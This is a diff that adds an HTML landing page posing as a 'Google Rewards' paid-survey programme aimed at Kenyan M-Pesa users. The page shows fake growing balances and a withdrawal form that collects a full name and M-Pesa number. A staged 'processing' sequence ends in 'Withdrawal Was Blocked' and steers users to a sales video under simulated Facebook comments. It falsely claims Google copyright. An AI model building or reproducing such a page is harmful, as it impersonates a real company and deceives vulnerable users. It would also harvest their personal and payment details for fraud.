@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="pt-MZ">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Rewards | Paid Surveys</title>
+    
+    <!-- Fontes -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Folha de estilo -->
+    <link rel="stylesheet" href="/css/styles.css">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/assets/favicon.png">
+
+    <!-- UTM Tracking (deve carregar antes dos pixels e do CTA do player) -->
+    <script src="/js/utm-tracking.js"></script>
+
+    <!-- UTMFY Pixel -->
+    <script
+        src="https://cdn.utmify.com.br/scripts/pixel/pixel.js"
+        data-pixel-id="6a0196e8709e4d83cacea86d"
+        async defer></script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1098711072684863');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1098711072684863&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+</head>
+
+<body>
+    <!-- Header principal -->
+    <header class="main-header">
+        <div class="container header-container">
+            <div class="logo-container">
+                <div class="logo-wrapper">
+                    <div class="logo">
+                        <span class="g1">G</span>
+                        <span class="o1">o</span>
+                        <span class="o2">o</span>
+                        <span class="g2">g</span>
+                        <span class="l">l</span>
+                        <span class="e">e</span>
+                    </div>
+                    <div class="rewards-text">Rewards</div>
+                </div>
+            </div>
+            
+            <div class="balance-container">
+                <div class="balance-card">
+                    <div class="balance-icon">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#38B764" stroke-width="1.5"/>
+                            <path d="M12 6V18" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                            <path d="M16.5 10H9.5C8.11929 10 7 8.88071 7 7.5C7 6.11929 8.11929 5 9.5 5H12" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                            <path d="M7.5 14H14.5C15.8807 14 17 15.1193 17 16.5C17 17.8807 15.8807 19 14.5 19H12" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <div class="balance-details">
+                        <div class="balance-label">BALANCE</div>
+                        <div class="balance-amount-wrapper">
+                            <span class="balance-amount" id="balance">10</span>
+                            <span class="balance-currency">USD</span>
+                        </div>
+                    </div>
+                    <div class="balance-update-indicator" id="balanceIndicator">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M8 3.33337V12.6667" stroke="#38B764" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M12 8.66663L8 12.6666L4 8.66663" stroke="#38B764" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Conteúdo principal -->
+    <main class="main-content">
+        <div class="container">
+            <!-- SEÇÃO DO QUIZ -->
+            <div id="quizSection">
+                <!-- Página de boas-vindas -->
+                <section id="welcomePage" class="page welcome-page">
+                    <div class="card welcome-card">
+                        <div class="card-emoji">🎁</div>
+                        <h1 class="welcome-title">Congratulations!</h1>
+                        <p class="welcome-subtitle">You have been selected for the new paid research program!</p>
+                        <div class="welcome-value">
+                            <span class="welcome-value-label">Initial value:</span>
+                            <span class="welcome-value-amount">17 USD</span>
+                        </div>
+                        <p class="welcome-description">
+                            Answer a few quick questions about your habits and preferences to help Google and earn real money.
+                        </p>
+                        <button class="btn btn-primary" id="startButton">
+                            <span>Start Now</span>
+                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M4.16675 10H15.8334" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M10.8334 5L15.8334 10L10.8334 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                        </button>
+                    </div>
+                </section>
+                
+                <!-- Página de perguntas -->
+                <section id="surveyPage" class="page survey-page hidden">
+                    <div class="card survey-card">
+                        <div class="survey-progress-container">
+                            <div class="survey-progress-wrapper">
+                                <div class="survey-progress-bar" id="progressBar"></div>
+                            </div>
+                            <div class="survey-progress-text" id="progressText">Question 1 of 5</div>
+                            <div class="survey-question-value" id="questionValue">Worth: 30 USD</div>
+                        </div>
+                        
+                        <div class="survey-question-container">
+                            <h2 class="survey-question" id="questionText">Which is your preferred mobile money service in Kenya?</h2>
+                            
+                            <div class="survey-options" id="optionsContainer">
+                                <!-- Opções serão inseridas via JavaScript -->
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Página de conclusão -->
+                <section id="completionPage" class="page completion-page hidden">
+                    <div class="card completion-card">
+                        <div class="card-emoji">🎉</div>
+                        <h2 class="completion-title">Research completed!</h2>
+                        <p class="completion-subtitle">Thank you for participating!</p>
+
+                        <div class="completion-balance-container">
+                            <div class="completion-balance-label">Your total balance</div>
+                            <div class="completion-balance-amount" id="finalBalance">0</div>
+                            <div class="completion-balance-currency">USD</div>
+                        </div>
+
+                        <button class="btn btn-primary btn-large" id="withdrawButton">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 4V20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M18 14L12 20L6 14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                            <span>Withdraw Money</span>
+                        </button>
+                    </div>
+                </section>
+
+                <!-- Página de formulário de saque -->
+                <section id="withdrawalFormPage" class="page withdrawal-page hidden">
+                    <div class="card withdrawal-card">
+                        <div class="withdrawal-header">
+                            <div class="withdrawal-icon-wrapper">
+                                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M3 21H21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M3 10H21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M12 3L21 10H3L12 3Z" stroke="#38B764" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M5 10V21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M9 10V21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M15 10V21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M19 10V21" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </div>
+                            <h2 class="withdrawal-title">Withdraw via M-Pesa</h2>
+                            <p class="withdrawal-subtitle">Enter your M-Pesa details to receive payment</p>
+                        </div>
+
+                        <div class="withdrawal-amount-display">
+                            <div class="withdrawal-amount-label">Available balance</div>
+                            <div class="withdrawal-amount-value" id="withdrawalFormBalance">0</div>
+                            <div class="withdrawal-amount-currency">USD</div>
+                        </div>
+
+                        <form id="withdrawalForm" class="withdrawal-form" autocomplete="off">
+                            <div class="form-group">
+                                <label class="form-label" for="wdFullName">Full Name</label>
+                                <input type="text" id="wdFullName" class="form-input" placeholder="Enter your full name" required>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label" for="wdPhone">M-Pesa Phone Number</label>
+                                <div class="phone-input-wrapper">
+                                    <span class="phone-prefix">🇰🇪 +254</span>
+                                    <input type="tel" id="wdPhone" class="form-input phone-input" placeholder="712 345 678" maxlength="13" inputmode="numeric" pattern="[0-9]*" required>
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label" for="wdProvider">Mobile Money Service</label>
+                                <select id="wdProvider" class="form-input form-select" required>
+                                    <option value="" disabled selected>Choose your provider</option>
+                                    <option value="M-Pesa (Safaricom)" selected>M-Pesa (Safaricom)</option>
+                                    <option value="Airtel Money">Airtel Money</option>
+                                    <option value="T-Kash (Telkom)">T-Kash (Telkom)</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label" for="wdAccount">Confirm M-Pesa Number</label>
+                                <div class="phone-input-wrapper">
+                                    <span class="phone-prefix">🇰🇪 +254</span>
+                                    <input type="text" id="wdAccount" class="form-input phone-input" placeholder="Re-enter number" maxlength="13" inputmode="numeric" pattern="[0-9]*" required>
+                                </div>
+                            </div>
+
+                            <div id="formError" class="form-error hidden">M-Pesa numbers do not match</div>
+
+                            <button type="submit" class="btn btn-primary btn-large btn-form-submit">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 4V20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M18 14L12 20L6 14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                                <span>Withdraw Now</span>
+                            </button>
+                        </form>
+                    </div>
+                </section>
+
+                <!-- Página de processamento de saque -->
+                <section id="withdrawalPage" class="page withdrawal-page hidden">
+                    <div class="card withdrawal-card withdrawal-processing-card">
+                        <div class="withdrawal-header">
+                            <div class="withdrawal-icon-wrapper withdrawal-icon-pulse">
+                                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="#38B764" stroke-width="1.5"/>
+                                    <path d="M12 7V17" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M15 9.5H10.5C9.67157 9.5 9 8.82843 9 8C9 7.17157 9.67157 6.5 10.5 6.5H12" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                    <path d="M9 14.5H13.5C14.3284 14.5 15 15.1716 15 16C15 16.8284 14.3284 17.5 13.5 17.5H12" stroke="#38B764" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </div>
+                            <h2 class="withdrawal-title">Processing Withdrawal</h2>
+                            <p class="withdrawal-subtitle">Please wait, do not close this page</p>
+                        </div>
+
+                        <!-- Recibo/resumo dos dados -->
+                        <div class="withdrawal-receipt">
+                            <div class="receipt-row">
+                                <span class="receipt-label">Name</span>
+                                <span class="receipt-value" id="receiptName">-</span>
+                            </div>
+                            <div class="receipt-divider"></div>
+                            <div class="receipt-row">
+                                <span class="receipt-label">Service</span>
+                                <span class="receipt-value" id="receiptBank">-</span>
+                            </div>
+                            <div class="receipt-divider"></div>
+                            <div class="receipt-row">
+                                <span class="receipt-label">M-Pesa Number</span>
+                                <span class="receipt-value" id="receiptAccount">-</span>
+                            </div>
+                            <div class="receipt-divider"></div>
+                            <div class="receipt-row">
+                                <span class="receipt-label">Amount</span>
+                                <span class="receipt-value receipt-value-highlight" id="receiptAmount">-</span>
+                            </div>
+                        </div>
+
+                        <div class="withdrawal-steps">
+                            <div class="withdrawal-step" id="wStep1">
+                                <div class="withdrawal-step-icon">
+                                    <div class="withdrawal-step-spinner"></div>
+                                </div>
+                                <div class="withdrawal-step-info">
+                                    <div class="withdrawal-step-name" id="wStep1Name">Verifying account</div>
+                                    <div class="withdrawal-step-status">Waiting...</div>
+                                </div>
+                            </div>
+                            <div class="withdrawal-step" id="wStep2">
+                                <div class="withdrawal-step-icon">
+                                    <div class="withdrawal-step-spinner"></div>
+                                </div>
+                                <div class="withdrawal-step-info">
+                                    <div class="withdrawal-step-name" id="wStep2Name">Validating account</div>
+                                    <div class="withdrawal-step-status">Waiting...</div>
+                                </div>
+                            </div>
+                            <div class="withdrawal-step" id="wStep3">
+                                <div class="withdrawal-step-icon">
+                                    <div class="withdrawal-step-spinner"></div>
+                                </div>
+                                <div class="withdrawal-step-info">
+                                    <div class="withdrawal-step-name" id="wStep3Name">Converting USD to KES</div>
+                                    <div class="withdrawal-step-status">Waiting...</div>
+                                </div>
+                            </div>
+                            <div class="withdrawal-step" id="wStep4">
+                                <div class="withdrawal-step-icon">
+                                    <div class="withdrawal-step-spinner"></div>
+                                </div>
+                                <div class="withdrawal-step-info">
+                                    <div class="withdrawal-step-name" id="wStep4Name">Requesting withdrawal</div>
+                                    <div class="withdrawal-step-status">Waiting...</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="withdrawal-progress-bar-container">
+                            <div class="withdrawal-progress-bar" id="withdrawalProgressBar"></div>
+                        </div>
+                        <div class="withdrawal-progress-text" id="withdrawalProgressText">0%</div>
+
+                        <div class="withdrawal-pending hidden" id="withdrawalPending">
+                            <div class="withdrawal-pending-icon">
+                                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <circle cx="12" cy="12" r="10" stroke="#FBBC04" stroke-width="1.5"/>
+                                    <path d="M12 7V12L15 15" stroke="#FBBC04" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <div class="withdrawal-pending-title">Withdrawal Was Blocked</div>
+                            <div class="withdrawal-pending-text">Your withdrawal was blocked. Watch the video to learn how to receive your payment.</div>
+                            <button class="btn btn-primary btn-pending-video" id="watchVideoBtn">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <polygon points="5,3 19,12 5,21" fill="currentColor"/>
+                                </svg>
+                                <span>Watch Video</span>
+                            </button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- SEÇÃO DA VSL -->
+            <section id="vslSection" class="vsl-section hidden">
+                <div class="card vsl-card">
+                    <h1 class="vsl-title">Congratulations on your balance! Here's how to receive it:</h1>
+
+                    <!-- Container vazio - player será injetado aqui via JavaScript -->
+                    <div class="video-container-mobile">
+                        <div id="vslPlayerContainer"></div>
+                    </div>
+                </div>
+
+                <!-- Facebook Comments Simulation -->
+                <div class="fb-comments-plugin">
+                    <div class="fb-comments-header">
+                        <div class="fb-comments-header-left">
+                            <svg class="fb-logo" width="20" height="20" viewBox="0 0 24 24" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M24 12C24 5.37258 18.6274 0 12 0C5.37258 0 0 5.37258 0 12C0 17.9895 4.38823 22.954 10.125 23.8542V15.4688H7.07812V12H10.125V9.35625C10.125 6.34875 11.9166 4.6875 14.6576 4.6875C15.9701 4.6875 17.3438 4.92188 17.3438 4.92188V7.875H15.8306C14.34 7.875 13.875 8.80008 13.875 9.75V12H17.2031L16.6711 15.4688H13.875V23.8542C19.6118 22.954 24 17.9895 24 12Z"/>
+                            </svg>
+                            <span class="fb-comments-title">Facebook Comments</span>
+                        </div>
+                        <span class="fb-comments-count" id="fbCommentsCount">0 comments</span>
+                    </div>
+                    <div class="fb-comments-list" id="fbCommentsList">
+                        <!-- Comments will be injected via JS -->
+                    </div>
+                    <div class="fb-comment-input-area">
+                        <div class="fb-comment-input-avatar">You</div>
+                        <div class="fb-comment-input-wrapper">
+                            <input type="text" class="fb-comment-input" id="fbCommentInput" placeholder="Write a comment...">
+                            <button class="fb-comment-send-btn" id="fbCommentSend" type="button">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+    
+    <!-- Rodapé -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <div class="logo-small">
+                        <span class="g1">G</span>
+                        <span class="o1">o</span>
+                        <span class="o2">o</span>
+                        <span class="g2">g</span>
+                        <span class="l">l</span>
+                        <span class="e">e</span>
+                    </div>
+                    <span class="footer-rewards">Rewards</span>
+                </div>
+                
+                <div class="footer-description">
+                    The Google Rewards program rewards participants for sharing their opinions and preferences, helping to improve products and services.
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Terms of Use</a>
+                    <span class="footer-link-separator">•</span>
+                    <a href="#" class="footer-link">Privacy Policy</a>
+                    <span class="footer-link-separator">•</span>
+                    <a href="#" class="footer-link">Help</a>
+                </div>
+                
+                <div class="footer-copyright">
+                    © <span id="currentYear">2025</span> Google LLC. All rights reserved.
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Popup de recompensa -->
+    <div class="reward-popup" id="rewardPopup">
+        <div class="reward-popup-content">
+            <div class="reward-popup-icon">💰</div>
+            <div class="reward-popup-amount" id="rewardAmount">+30 USD</div>
+            <div class="reward-popup-text">Added to your balance!</div>
+        </div>
+        <div id="confettiCanvas" class="confetti-container"></div>
+    </div>
+    
+    <div class="overlay" id="overlay"></div>
+    
+    <!-- JavaScript -->
+    <script src="js/script.js"></script>
+
+
+</body>
+</html>
